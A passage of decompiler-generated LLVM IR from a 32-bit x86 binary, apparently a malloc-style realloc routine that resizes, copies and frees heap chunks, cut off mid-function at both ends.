  store i32 %v1_8053419, i32* @edi, align 4
  %v1_805341c = add i32 %tmp6, -4
  %v2_805341c = inttoptr i32 %v1_805341c to i32*
  %v3_805341c = load i32, i32* %v2_805341c, align 4
  store i32 %v3_805341c, i32* @edx, align 4
  %v1_8053421 = and i32 %v3_805341c, -4
  store i32 %v1_8053421, i32* %eax.global-to-local, align 4
  %v2_8053428 = and i32 %v3_805341c, 2
  %v3_8053428 = icmp eq i32 %v2_8053428, 0
  %v1_805342b = icmp eq i1 %v3_8053428, false
  br i1 %v1_805342b, label %dec_label_pc_80535c5, label %dec_label_pc_8053431

dec_label_pc_8053431:                             ; preds = %dec_label_pc_8053415
  store i32 %stack_var_-40.0, i32* %ecx.global-to-local, align 4
  store i32 %v1_8053421, i32* @ebx, align 4
  %v7_8053437 = icmp ult i32 %v1_8053421, %stack_var_-40.0
  %v1_8053439 = icmp eq i1 %v7_8053437, false
  br i1 %v1_8053439, label %dec_label_pc_8053570, label %dec_label_pc_805343f

dec_label_pc_805343f:                             ; preds = %dec_label_pc_8053431
  %v2_805343f = add i32 %v1_8053421, %v1_8053419
  store i32 %v2_805343f, i32* @esi, align 4
  %v1_8053442 = load i32, i32* @global_var_8056bac.207, align 4
  %v12_8053442 = icmp eq i32 %v2_805343f, %v1_8053442
  %v1_8053448 = icmp eq i1 %v12_8053442, false
  %v1_8053482 = add i32 %v2_805343f, 4
  %v2_8053482 = inttoptr i32 %v1_8053482 to i32*
  %v3_8053482 = load i32, i32* %v2_8053482, align 4
  br i1 %v1_8053448, label %dec_label_pc_8053482, label %dec_label_pc_805344a

dec_label_pc_805344a:                             ; preds = %dec_label_pc_805343f
  %v1_805344f = and i32 %v3_8053482, -4
  %v2_8053452 = add i32 %v1_805344f, %v1_8053421
  store i32 %v2_8053452, i32* %ecx.global-to-local, align 4
  %v1_8053458 = add i32 %stack_var_-40.0, 16
  store i32 %v1_8053458, i32* %eax.global-to-local, align 4
  %v7_805345b = icmp ult i32 %v2_8053452, %v1_8053458
  br i1 %v7_805345b, label %dec_label_pc_80534c0, label %dec_label_pc_805345f

dec_label_pc_805345f:                             ; preds = %dec_label_pc_805344a
  %v1_805345f = urem i32 %v3_805341c, 2
  %v5_8053462 = or i32 %v1_805345f, %stack_var_-40.0
  store i32 %v5_8053462, i32* @edx, align 4
  store i32 %v5_8053462, i32* %v2_805341c, align 4
  %v0_805346d = load i32, i32* %ecx.global-to-local, align 4
  %v2_805346d = sub i32 %v0_805346d, %stack_var_-40.0
  %v0_805346f = load i32, i32* @edi, align 4
  %v2_805346f = add i32 %v0_805346f, %stack_var_-40.0
  store i32 %v2_805346f, i32* %eax.global-to-local, align 4
  %v1_8053472 = or i32 %v2_805346d, 1
  store i32 %v1_8053472, i32* %ecx.global-to-local, align 4
  store i32 %v2_805346f, i32* @global_var_8056bac.207, align 4
  %v2_805347a = add i32 %v2_805346f, 4
  %v3_805347a = inttoptr i32 %v2_805347a to i32*
  store i32 %v1_8053472, i32* %v3_805347a, align 4
  br label %dec_label_pc_8053695

dec_label_pc_8053482:                             ; preds = %dec_label_pc_805343f
  %v1_8053487 = and i32 %v3_8053482, -2
  store i32 %v1_8053487, i32* %eax.global-to-local, align 4
  %v3_805348a = add i32 %v1_8053482, %v1_8053487
  %v4_805348a = inttoptr i32 %v3_805348a to i8*
  %v5_805348a = load i8, i8* %v4_805348a, align 1
  %v6_805348a = urem i8 %v5_805348a, 2
  %v7_805348a = icmp eq i8 %v6_805348a, 0
  %v1_805348f = icmp eq i1 %v7_805348a, false
  br i1 %v1_805348f, label %dec_label_pc_80534c0, label %dec_label_pc_8053491

dec_label_pc_8053491:                             ; preds = %dec_label_pc_8053482
  %v1_8053491 = and i32 %v3_8053482, -4
  %v2_8053498 = add i32 %v1_8053491, %v1_8053421
  store i32 %v2_8053498, i32* @ebx, align 4
  %v10_805349a = icmp ult i32 %v2_8053498, %stack_var_-40.0
  br i1 %v10_805349a, label %dec_label_pc_80534c0, label %dec_label_pc_80534a0

dec_label_pc_80534a0:                             ; preds = %dec_label_pc_8053491
  %v1_80534a0 = add i32 %v1_8053421, %tmp6
  %v2_80534a0 = inttoptr i32 %v1_80534a0 to i32*
  %v3_80534a0 = load i32, i32* %v2_80534a0, align 4
  store i32 %v3_80534a0, i32* @edx, align 4
  %v1_80534a3 = add i32 %v2_805343f, 12
  %v2_80534a3 = inttoptr i32 %v1_80534a3 to i32*
  %v3_80534a3 = load i32, i32* %v2_80534a3, align 4
  store i32 %v3_80534a3, i32* %eax.global-to-local, align 4
  %v1_80534a6 = add i32 %v3_80534a0, 12
  %v2_80534a6 = inttoptr i32 %v1_80534a6 to i32*
  %v3_80534a6 = load i32, i32* %v2_80534a6, align 4
  %v15_80534a6 = icmp eq i32 %v3_80534a6, %v2_805343f
  %v1_80534a9 = icmp eq i1 %v15_80534a6, false
  br i1 %v1_80534a9, label %dec_label_pc_80534b0, label %dec_label_pc_80534ab

dec_label_pc_80534ab:                             ; preds = %dec_label_pc_80534a0
  %v1_80534ab = add i32 %v3_80534a3, 8
  %v2_80534ab = inttoptr i32 %v1_80534ab to i32*
  %v3_80534ab = load i32, i32* %v2_80534ab, align 4
  %v15_80534ab = icmp eq i32 %v3_80534ab, %v2_805343f
  br i1 %v15_80534ab, label %dec_label_pc_80534b5, label %dec_label_pc_80534b0

dec_label_pc_80534b0:                             ; preds = %dec_label_pc_80534ab, %dec_label_pc_80534a0
  %v0_80534b0 = call i32 @function_8053a85()
  store i32 %v0_80534b0, i32* %eax.global-to-local, align 4
  %v1_80534b5.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80534b5

dec_label_pc_80534b5:                             ; preds = %dec_label_pc_80534ab, %dec_label_pc_80534b0
  %v1_80534b5 = phi i32 [ %v3_80534a0, %dec_label_pc_80534ab ], [ %v1_80534b5.pre, %dec_label_pc_80534b0 ]
  %v0_80534b5 = phi i32 [ %v3_80534a3, %dec_label_pc_80534ab ], [ %v0_80534b0, %dec_label_pc_80534b0 ]
  %v2_80534b5 = add i32 %v1_80534b5, 12
  %v3_80534b5 = inttoptr i32 %v2_80534b5 to i32*
  store i32 %v0_80534b5, i32* %v3_80534b5, align 4
  %v0_80534b8 = load i32, i32* @edx, align 4
  %v1_80534b8 = load i32, i32* %eax.global-to-local, align 4
  %v2_80534b8 = add i32 %v1_80534b8, 8
  %v3_80534b8 = inttoptr i32 %v2_80534b8 to i32*
  store i32 %v0_80534b8, i32* %v3_80534b8, align 4
  %v0_8053570.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8053570

dec_label_pc_80534c0:                             ; preds = %dec_label_pc_8053491, %dec_label_pc_8053482, %dec_label_pc_805344a
  %v1_80534c7 = add i32 %stack_var_-40.0, -7
  store i32 %v1_80534c7, i32* %eax.global-to-local, align 4
  store i32 %v1_80534c7, i32* %stack_var_-60, align 4
  %v1_80534cb = call i32 @function_8052b24(i32 %v1_80534c7)
  store i32 %v1_80534cb, i32* %eax.global-to-local, align 4
  store i32 %v1_80534cb, i32* @edx, align 4
  %v1_80534d5 = icmp eq i32 %v1_80534cb, 0
  br i1 %v1_80534d5, label %dec_label_pc_8053691, label %dec_label_pc_80534dd

dec_label_pc_80534dd:                             ; preds = %dec_label_pc_80534c0
  %v1_80534dd = add i32 %v1_80534cb, -8
  store i32 %v1_80534dd, i32* %ebx.global-to-local, align 4
  %v1_80534e0 = load i32, i32* @esi, align 4
  %v12_80534e0 = icmp eq i32 %v1_80534dd, %v1_80534e0
  %v1_80534e2 = add i32 %v1_80534cb, -4
  %v2_80534e2 = inttoptr i32 %v1_80534e2 to i32*
  %v3_80534e2 = load i32, i32* %v2_80534e2, align 4
  store i32 %v3_80534e2, i32* %eax.global-to-local, align 4
  %v1_80534e5 = icmp eq i1 %v12_80534e0, false
  br i1 %v1_80534e5, label %dec_label_pc_80534f3, label %dec_label_pc_80534e7

dec_label_pc_80534e7:                             ; preds = %dec_label_pc_80534dd
  %v1_80534e7 = and i32 %v3_80534e2, -4
  store i32 %v1_80534e7, i32* %eax.global-to-local, align 4
  store i32 %v1_8053421, i32* @edx, align 4
  %v2_80534ee = add i32 %v1_80534e7, %v1_8053421
  store i32 %v2_80534ee, i32* @ebx, align 4
  br label %dec_label_pc_8053570

dec_label_pc_80534f3:                             ; preds = %dec_label_pc_80534dd
  %v1_80534f7 = add i32 %v1_8053421, -4
  store i32 %v1_80534f7, i32* %eax.global-to-local, align 4
  %v2_80534fc = udiv i32 %v1_80534f7, 4
  store i32 %v2_80534fc, i32* %ecx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_80534f7, 37
  br i1 %tmp, label %dec_label_pc_8053515, label %dec_label_pc_8053504

dec_label_pc_8053504:                             ; preds = %dec_label_pc_80534f3
  store i32 %v1_80534cb, i32* %stack_var_-60, align 4
  %v3_805350b = inttoptr i32 %v1_80534cb to i16*
  %v4_805350b = call i32 @function_8054912(i16* %v3_805350b, i32 %tmp6, i32 %v1_80534f7)
  store i32 %v4_805350b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805355c

dec_label_pc_8053515:                             ; preds = %dec_label_pc_80534f3
  store i32 %tmp6, i32* @esi, align 4
  %v1_805351c = inttoptr i32 %tmp6 to i32*
  %v2_805351c = load i32, i32* %v1_805351c, align 4
  store i32 %v2_805351c, i32* %eax.global-to-local, align 4
  %v2_805351e = inttoptr i32 %v1_80534cb to i32*
  store i32 %v2_805351c, i32* %v2_805351e, align 4
  %v0_8053520 = load i32, i32* @esi, align 4
  %v1_8053520 = add i32 %v0_8053520, 4
  %v2_8053520 = inttoptr i32 %v1_8053520 to i32*
  %v3_8053520 = load i32, i32* %v2_8053520, align 4
  store i32 %v3_8053520, i32* %eax.global-to-local, align 4
  %v1_8053523 = load i32, i32* @edx, align 4
  %v2_8053523 = add i32 %v1_8053523, 4
  %v3_8053523 = inttoptr i32 %v2_8053523 to i32*
  store i32 %v3_8053520, i32* %v3_8053523, align 4
  %v0_8053526 = load i32, i32* @esi, align 4
  %v1_8053526 = add i32 %v0_8053526, 8
  %v2_8053526 = inttoptr i32 %v1_8053526 to i32*
  %v3_8053526 = load i32, i32* %v2_8053526, align 4
  store i32 %v3_8053526, i32* %eax.global-to-local, align 4
  %v1_8053529 = load i32, i32* @edx, align 4
  %v2_8053529 = add i32 %v1_8053529, 8
  %v3_8053529 = inttoptr i32 %v2_8053529 to i32*
  store i32 %v3_8053526, i32* %v3_8053529, align 4
  %tmp27 = icmp ult i32 %v1_80534f7, 17
  br i1 %tmp27, label %dec_label_pc_805355c, label %dec_label_pc_805352e

dec_label_pc_805352e:                             ; preds = %dec_label_pc_8053515
  %v0_805352e = load i32, i32* @esi, align 4
  %v1_805352e = add i32 %v0_805352e, 12
  %v2_805352e = inttoptr i32 %v1_805352e to i32*
  %v3_805352e = load i32, i32* %v2_805352e, align 4
  store i32 %v3_805352e, i32* %eax.global-to-local, align 4
  %v0_8053531 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053534 = load i32, i32* @edx, align 4
  %v2_8053534 = add i32 %v1_8053534, 12
  %v3_8053534 = inttoptr i32 %v2_8053534 to i32*
  store i32 %v3_805352e, i32* %v3_8053534, align 4
  %v0_8053537 = load i32, i32* @esi, align 4
  %v1_8053537 = add i32 %v0_8053537, 16
  %v2_8053537 = inttoptr i32 %v1_8053537 to i32*
  %v3_8053537 = load i32, i32* %v2_8053537, align 4
  store i32 %v3_8053537, i32* %eax.global-to-local, align 4
  %v1_805353a = load i32, i32* @edx, align 4
  %v2_805353a = add i32 %v1_805353a, 16
  %v3_805353a = inttoptr i32 %v2_805353a to i32*
  store i32 %v3_8053537, i32* %v3_805353a, align 4
  %tmp21 = icmp ult i32 %v0_8053531, 7
  br i1 %tmp21, label %dec_label_pc_805355c, label %dec_label_pc_805353f

dec_label_pc_805353f:                             ; preds = %dec_label_pc_805352e
  %v0_805353f = load i32, i32* @esi, align 4
  %v1_805353f = add i32 %v0_805353f, 20
  %v2_805353f = inttoptr i32 %v1_805353f to i32*
  %v3_805353f = load i32, i32* %v2_805353f, align 4
  store i32 %v3_805353f, i32* %eax.global-to-local, align 4
  %v0_8053542 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053545 = load i32, i32* @edx, align 4
  %v2_8053545 = add i32 %v1_8053545, 20
  %v3_8053545 = inttoptr i32 %v2_8053545 to i32*
  store i32 %v3_805353f, i32* %v3_8053545, align 4
  %v0_8053548 = load i32, i32* @esi, align 4
  %v1_8053548 = add i32 %v0_8053548, 24
  %v2_8053548 = inttoptr i32 %v1_8053548 to i32*
  %v3_8053548 = load i32, i32* %v2_8053548, align 4
  store i32 %v3_8053548, i32* %eax.global-to-local, align 4
  %v1_805354b = load i32, i32* @edx, align 4
  %v2_805354b = add i32 %v1_805354b, 24
  %v3_805354b = inttoptr i32 %v2_805354b to i32*
  store i32 %v3_8053548, i32* %v3_805354b, align 4
  %tmp22 = icmp ult i32 %v0_8053542, 9
  br i1 %tmp22, label %dec_label_pc_805355c, label %dec_label_pc_8053550

dec_label_pc_8053550:                             ; preds = %dec_label_pc_805353f
  %v0_8053550 = load i32, i32* @esi, align 4
  %v1_8053550 = add i32 %v0_8053550, 28
  %v2_8053550 = inttoptr i32 %v1_8053550 to i32*
  %v3_8053550 = load i32, i32* %v2_8053550, align 4
  store i32 %v3_8053550, i32* %eax.global-to-local, align 4
  %v1_8053553 = load i32, i32* @edx, align 4
  %v2_8053553 = add i32 %v1_8053553, 28
  %v3_8053553 = inttoptr i32 %v2_8053553 to i32*
  store i32 %v3_8053550, i32* %v3_8053553, align 4
  %v0_8053556 = load i32, i32* @esi, align 4
  %v1_8053556 = add i32 %v0_8053556, 32
  %v2_8053556 = inttoptr i32 %v1_8053556 to i32*
  %v3_8053556 = load i32, i32* %v2_8053556, align 4
  store i32 %v3_8053556, i32* %eax.global-to-local, align 4
  %v1_8053559 = load i32, i32* @edx, align 4
  %v2_8053559 = add i32 %v1_8053559, 32
  %v3_8053559 = inttoptr i32 %v2_8053559 to i32*
  store i32 %v3_8053556, i32* %v3_8053559, align 4
  br label %dec_label_pc_805355c

dec_label_pc_805355c:                             ; preds = %dec_label_pc_805353f, %dec_label_pc_805352e, %dec_label_pc_8053515, %dec_label_pc_8053504, %dec_label_pc_8053550
  %v0_805355f = load i32, i32* %ebx.global-to-local, align 4
  %v1_805355f = add i32 %v0_805355f, 8
  store i32 %v1_805355f, i32* @ebx, align 4
  store i32 %tmp6, i32* %stack_var_-60, align 4
  %v1_8053566 = call i32 @function_80538e9(i32 %tmp6)
  br label %dec_label_pc_805368c

dec_label_pc_8053570:                             ; preds = %dec_label_pc_8053431, %dec_label_pc_80534e7, %dec_label_pc_80534b5
  %v1_8053581 = phi i32 [ %v1_8053421, %dec_label_pc_8053431 ], [ %v2_80534ee, %dec_label_pc_80534e7 ], [ %v0_8053570.pre, %dec_label_pc_80534b5 ]
  %v5_8053572 = sub i32 %v1_8053581, %stack_var_-40.0
  store i32 %v5_8053572, i32* %ecx.global-to-local, align 4
  %tmp23 = icmp ult i32 %v5_8053572, 16
  br i1 %tmp23, label %dec_label_pc_805357b, label %dec_label_pc_805358d

dec_label_pc_805357b:                             ; preds = %dec_label_pc_8053570
  %v0_805357b = load i32, i32* @edi, align 4
  %v1_805357b = add i32 %v0_805357b, 4
  %v2_805357b = inttoptr i32 %v1_805357b to i32*
  %v3_805357b = load i32, i32* %v2_805357b, align 4
  %v1_805357e = urem i32 %v3_805357b, 2
  %v2_8053581 = or i32 %v1_805357e, %v1_8053581
  store i32 %v2_8053581, i32* %eax.global-to-local, align 4
  store i32 %v2_8053581, i32* %v2_805357b, align 4
  %v0_8053586 = load i32, i32* @edi, align 4
  %v1_8053586 = load i32, i32* @ebx, align 4
  %v2_8053586 = add i32 %v0_8053586, 4
  %v3_8053586 = add i32 %v2_8053586, %v1_8053586
  %v4_8053586 = inttoptr i32 %v3_8053586 to i32*
  %v5_8053586 = load i32, i32* %v4_8053586, align 4
  %v6_8053586 = or i32 %v5_8053586, 1
  store i32 %v6_8053586, i32* %v4_8053586, align 4
  br label %dec_label_pc_80535bd

dec_label_pc_805358d:                             ; preds = %dec_label_pc_8053570
  %v0_8053591 = load i32, i32* @edi, align 4
  %v2_8053591 = add i32 %v0_8053591, %stack_var_-40.0
  store i32 %v2_8053591, i32* %eax.global-to-local, align 4
  %v1_8053594 = add i32 %v0_8053591, 4
  %v2_8053594 = inttoptr i32 %v1_8053594 to i32*
  %v3_8053594 = load i32, i32* %v2_8053594, align 4
  %v1_8053597 = urem i32 %v3_8053594, 2
  %v5_805359a = or i32 %v1_8053597, %stack_var_-40.0
  store i32 %v5_805359a, i32* %v2_8053594, align 4
  %v0_80535a4 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80535a6 = or i32 %v0_80535a4, 1
  store i32 %v1_80535a6, i32* @edx, align 4
  %v1_80535a9 = load i32, i32* %eax.global-to-local, align 4
  %v2_80535a9 = add i32 %v1_80535a9, 4
  %v3_80535a9 = inttoptr i32 %v2_80535a9 to i32*
  store i32 %v1_80535a6, i32* %v3_80535a9, align 4
  %v0_80535ac = load i32, i32* %eax.global-to-local, align 4
  %v1_80535ac = load i32, i32* %ecx.global-to-local, align 4
  %v2_80535ac = add i32 %v0_80535ac, 4
  %v3_80535ac = add i32 %v2_80535ac, %v1_80535ac
  %v4_80535ac = inttoptr i32 %v3_80535ac to i32*
  %v5_80535ac = load i32, i32* %v4_80535ac, align 4
  %v6_80535ac = or i32 %v5_80535ac, 1
  store i32 %v6_80535ac, i32* %v4_80535ac, align 4
  %v0_80535b1 = load i32, i32* %eax.global-to-local, align 4
  %v1_80535b1 = add i32 %v0_80535b1, 8
  store i32 %v1_80535b1, i32* %eax.global-to-local, align 4
  store i32 %v1_80535b1, i32* %stack_var_-60, align 4
  %v1_80535b5 = call i32 @function_80538e9(i32 %v1_80535b1)
  store i32 %v1_80535b5, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80535bd

dec_label_pc_80535bd:                             ; preds = %dec_label_pc_805357b, %dec_label_pc_805358d
  %v0_80535bd = load i32, i32* @edi, align 4
  %v1_80535bd = add i32 %v0_80535bd, 8
  store i32 %v1_80535bd, i32* @ebx, align 4
  br label %dec_label_pc_8053699

dec_label_pc_80535c5:                             ; preds = %dec_label_pc_8053415
  store i32 %tmp6, i32* %ecx.global-to-local, align 4
  %v0_80535c9 = load i32, i32* @global_var_8056edc.212, align 4
  %v1_80535ce = add i32 %v0_80535c9, -1
  store i32 %v1_80535ce, i32* %eax.global-to-local, align 4
  %v2_80535d3 = inttoptr i32 %v1_8053419 to i32*
  %v3_80535d3 = load i32, i32* %v2_80535d3, align 4
  store i32 %v3_80535d3, i32* @ebp, align 4
  %v1_80535d6 = or i32 %stack_var_-40.0, 4
  store i32 %v1_80535d6, i32* %stack_var_-44, align 4
  %v2_80535dc = add i32 %v3_80535d3, %v1_80535ce
  store i32 %v2_80535dc, i32* @edx, align 4
  %v1_80535df = sub i32 0, %v0_80535c9
  store i32 %v1_80535df, i32* %eax.global-to-local, align 4
  %v2_80535e1 = add i32 %v2_80535dc, %v1_80535d6
  %v2_80535e4 = and i32 %v2_80535e1, %v1_80535df
  store i32 %v2_80535e4, i32* @esi, align 4
  %v2_80535e8 = sub i32 %v2_80535e4, %v3_80535d3
  store i32 %v2_80535e8, i32* @ebx, align 4
  %v15_80535ea = icmp eq i32 %v1_8053421, %v2_80535e8
  br i1 %v15_80535ea, label %dec_label_pc_8053695, label %dec_label_pc_80535f4

dec_label_pc_80535f4:                             ; preds = %dec_label_pc_80535c5
  %v2_80535fb = sub i32 %v1_8053419, %v3_80535d3
  store i32 %v2_80535fb, i32* @edi, align 4
  %v2_80535fd = add i32 %v3_80535d3, %v1_8053421
  store i32 %v2_80535fd, i32* %eax.global-to-local, align 4
  store i32 %v2_80535fb, i32* %stack_var_-60, align 4
  %v6_8053601 = inttoptr i32 %v2_80535fb to i32*
  %v7_8053601 = call i32 @function_8054776(i32* %v6_8053601, i32 %v2_80535fd, i32 %v2_80535e4, i32 1, i32 %v1_80535d6, i32 %v1_8053421)
  store i32 %v7_8053601, i32* %eax.global-to-local, align 4
  %v10_8053609 = icmp eq i32 %v7_8053601, -1
  br i1 %v10_8053609, label %dec_label_pc_805364d, label %dec_label_pc_805360e

dec_label_pc_805360e:                             ; preds = %dec_label_pc_80535f4
  %v1_805360e = load i32, i32* @ebp, align 4
  %v2_805360e = add i32 %v1_805360e, %v7_8053601
  store i32 %v2_805360e, i32* @edx, align 4
  %v0_8053611 = load i32, i32* @ebx, align 4
  %v1_8053611 = or i32 %v0_8053611, 2
  store i32 %v1_8053611, i32* %ebx.global-to-local, align 4
  %v0_8053614 = load i32, i32* @esi, align 4
  store i32 %v0_8053614, i32* %eax.global-to-local, align 4
  %v2_8053616 = add i32 %v2_805360e, 4
  %v3_8053616 = inttoptr i32 %v2_8053616 to i32*
  store i32 %v1_8053611, i32* %v3_8053616, align 4
  %v0_8053619 = load i32, i32* %eax.global-to-local, align 4
  %v5_8053619 = sub i32 %v0_8053619, %v1_8053421
  %v1_805361d = load i32, i32* @global_var_8056ee4.217, align 4
  %v2_805361d = add i32 %v1_805361d, %v5_8053619
  store i32 %v2_805361d, i32* %eax.global-to-local, align 4
  store i32 %v2_805361d, i32* @global_var_8056ee4.217, align 4
  %v1_8053628 = load i32, i32* @global_var_8056ef0.218, align 16
  %tmp24 = icmp ugt i32 %v2_805361d, %v1_8053628
  br i1 %tmp24, label %dec_label_pc_8053630, label %dec_label_pc_8053635

dec_label_pc_8053630:                             ; preds = %dec_label_pc_805360e
  store i32 %v2_805361d, i32* @global_var_8056ef0.218, align 16
  br label %dec_label_pc_8053635

dec_label_pc_8053635:                             ; preds = %dec_label_pc_805360e, %dec_label_pc_8053630
  %v1_8053635 = load i32, i32* @global_var_8056ee8.219, align 8
  %v2_8053635 = add i32 %v1_8053635, %v2_805361d
  store i32 %v2_8053635, i32* %eax.global-to-local, align 4
  %v1_805363b = load i32, i32* @global_var_8056ef4.220, align 4
  %tmp25 = icmp ugt i32 %v2_8053635, %v1_805363b
  br i1 %tmp25, label %dec_label_pc_8053643, label %dec_label_pc_8053648

dec_label_pc_8053643:                             ; preds = %dec_label_pc_8053635
  store i32 %v2_8053635, i32* @global_var_8056ef4.220, align 4
  br label %dec_label_pc_8053648

dec_label_pc_8053648:                             ; preds = %dec_label_pc_8053635, %dec_label_pc_8053643
  %v0_8053648 = load i32, i32* @edx, align 4
  %v1_8053648 = add i32 %v0_8053648, 8
  store i32 %v1_8053648, i32* @ebx, align 4
  br label %dec_label_pc_8053699

dec_label_pc_805364d:                             ; preds = %dec_label_pc_80535f4
  %v2_805364d = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_805364d, i32* %eax.global-to-local, align 4
  %v10_8053650 = icmp ult i32 %v1_8053421, %v2_805364d
  %v1_8053654 = icmp eq i1 %v10_8053650, false
  br i1 %v1_8053654, label %dec_label_pc_8053695, label %dec_label_pc_8053656

dec_label_pc_8053656:                             ; preds = %dec_label_pc_805364d
  %v1_805365d = add i32 %stack_var_-40.0, -7
  store i32 %v1_805365d, i32* %eax.global-to-local, align 4
  store i32 %v1_805365d, i32* %stack_var_-60, align 4
  %v1_8053661 = call i32 @function_8052b24(i32 %v1_805365d)
  store i32 %v1_8053661, i32* %eax.global-to-local, align 4
  store i32 %v1_8053661, i32* @ebx, align 4
  %v1_805366b = icmp eq i32 %v1_8053661, 0
  br i1 %v1_805366b, label %dec_label_pc_8053691, label %dec_label_pc_805366f

dec_label_pc_805366f:                             ; preds = %dec_label_pc_8053656
  %v1_8053674 = add i32 %v1_8053421, -8
  store i32 %v1_8053674, i32* %eax.global-to-local, align 4
  store i32 %v1_8053661, i32* %stack_var_-60, align 4
  %v3_805367d = inttoptr i32 %v1_8053661 to i16*
  %v4_805367d = call i32 @function_8054912(i16* %v3_805367d, i32 %tmp6, i32 %v1_8053674)
  store i32 %v4_805367d, i32* %eax.global-to-local, align 4
  store i32 %v1_8053661, i32* @edx, align 4
  store i32 %tmp6, i32* %stack_var_-60, align 4
  %v1_8053687 = call i32 @function_80538e9(i32 %tmp6)
  br label %dec_label_pc_805368c

dec_label_pc_805368c:                             ; preds = %dec_label_pc_805355c, %dec_label_pc_805366f
  %storemerge = phi i32 [ %v1_8053687, %dec_label_pc_805366f ], [ %v1_8053566, %dec_label_pc_805355c ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053699

dec_label_pc_8053691:                             ; preds = %dec_label_pc_8053656, %dec_label_pc_80534c0
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8053699

dec_label_pc_8053695:                             ; preds = %dec_label_pc_805364d, %dec_label_pc_80535c5, %dec_label_pc_805345f
  store i32 %tmp6, i32* @ebx, align 4
  br label %dec_label_pc_8053699

dec_label_pc_8053699:                             ; preds = %dec_label_pc_8053691, %dec_label_pc_805368c, %dec_label_pc_8053648, %dec_label_pc_80535bd, %dec_label_pc_8053695
  store i32 %v2_80533ce, i32* @eax, align 4
  store i32 %v2_80533ce, i32* %stack_var_-60, align 4
  %v2_80536a2 = call i32 @function_8054050(i32 %v2_80533ce, i32 1)
  store i32 %v2_80536a2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80536a7

dec_label_pc_80536a7:                             ; preds = %dec_label_pc_80533b2, %dec_label_pc_805339e, %dec_label_pc_8053699
  br label %dec_label_pc_80536aa

dec_label_pc_80536aa:                             ; preds = %dec_label_pc_80533ec, %dec_label_pc_80536a7
  %v0_80536ad = load i32, i32* @ebx, align 4
  store i32 %v0_80536ad, i32* %eax.global-to-local, align 4
  store i32 %v0_805338f, i32* @ebx, align 4
  store i32 %v0_805338e, i32* @esi, align 4
  store i32 %v0_805338d, i32* @edi, align 4
  store i32 %v0_805338c, i32* @ebp, align 4
  ret i32 %v0_80536ad

; uselistorder directives
  uselistorder i32 %v1_8053661, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32 %v2_8053635, { 1, 0, 2 }
  uselistorder i32 %v2_805361d, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v2_80535fb, { 1, 0, 2 }
  uselistorder i32 %v1_80535d6, { 1, 0, 2 }
  uselistorder i32 %v3_80535d3, { 0, 2, 3, 1, 4 }
  uselistorder i32 %v0_8053591, { 1, 0 }
  uselistorder i32 %v1_80534f7, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_80534cb, { 1, 3, 2, 0, 4, 6, 5, 7 }
  uselistorder i32 %v2_805346f, { 1, 0, 2 }
  uselistorder i32 %v3_8053482, { 0, 2, 1 }
  uselistorder i32 %v2_805343f, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v1_8053421, { 13, 14, 12, 15, 0, 6, 7, 11, 1, 10, 2, 3, 4, 5, 9, 8, 16 }
  uselistorder i32 %v1_8053419, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-40.0, { 12, 4, 0, 1, 9, 8, 7, 2, 5, 3, 6, 11, 10 }
  uselistorder i32 %v1_805340e, { 1, 0 }
  uselistorder i32 %v1_80533fe, { 0, 2, 1 }
  uselistorder i32 %v0_80533e7, { 1, 0 }
  uselistorder i32 %v2_80533ce, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %stack_var_-60, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 13 }
  uselistorder i32 %tmp7, { 0, 2, 1, 3 }
  uselistorder i32 %tmp6, { 15, 14, 13, 2, 12, 11, 10, 1, 9, 3, 0, 8, 7, 6, 5, 4 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 50, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 39, 40, 38, 41, 42, 43, 44, 0, 45, 46, 47, 48, 49 }
  uselistorder i32 -32, { 0, 1, 5, 4, 6, 7, 8, 9, 2, 3 }
  uselistorder i32 (i32)* @function_80538e9, { 10, 9, 8, 7, 2, 3, 1, 0, 6, 5, 11, 4 }
  uselistorder i32 (i32)* @function_8052b24, { 6, 5, 4, 0, 1, 3, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 2 }
  uselistorder label %dec_label_pc_80536aa, { 1, 0 }
  uselistorder label %dec_label_pc_80536a7, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053699, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_805368c, { 1, 0 }
  uselistorder label %dec_label_pc_8053648, { 1, 0 }
  uselistorder label %dec_label_pc_8053635, { 1, 0 }
  uselistorder label %dec_label_pc_80535bd, { 1, 0 }
  uselistorder label %dec_label_pc_8053570, { 1, 2, 0 }
  uselistorder label %dec_label_pc_805355c, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_80534b5, { 1, 0 }
  uselistorder label %dec_label_pc_8053415, { 1, 0 }
}

define i32 @function_80536b4() local_unnamed_addr {
dec_label_pc_80536b4:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %v0_80536bb = load i32, i32* @edx, align 4
  store i32 %v0_80536bb, i32* %ebp.global-to-local, align 4
  %v1_80536bd = add i32 %v0_80536bb, 860
  %v2_80536bd = inttoptr i32 %v1_80536bd to i32*
